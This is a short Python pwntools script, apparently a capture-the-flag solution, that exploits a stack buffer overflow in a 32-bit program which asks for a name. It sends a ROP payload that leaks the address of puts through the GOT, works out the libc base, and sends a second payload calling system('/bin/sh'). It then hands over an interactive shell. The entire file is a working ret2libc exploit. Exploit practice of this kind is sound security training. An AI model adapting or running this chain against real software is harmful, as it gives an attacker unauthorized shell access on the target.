from parse_args_and_some_func import *

sh = all_parsed_args["io"]
cur_elf = all_parsed_args["cur_elf"]

libc = cur_elf.libc
if not all_parsed_args["debug_enable"]:
    libc = ELF("/root/LibcSearcher/libc-database/other_libc_so/libc_32-2.23.so")
payload = 16 * b"I" + p32(cur_elf.sym["puts"]) + p32(0x80492f5) + p32(cur_elf.got["puts"])

sh.sendafter("Hello,please tell me your name!\n", payload)

sh.recvuntil("pretty" * 16)
msg = sh.recvn(16)
puts_addr = u32(msg[-4:])
LOG_ADDR("puts_addr", puts_addr)

libc_base_addr = puts_addr - libc.sym["puts"]
system_addr = libc_base_addr + libc.sym["system"]
str_bin_sh = libc_base_addr + libc.search(b"/bin/sh").__next__()

payload = 16 * b"I" + p32(system_addr) + p32(0xdeadbeef) + p32(str_bin_sh)
sh.send(payload)

sh.interactive()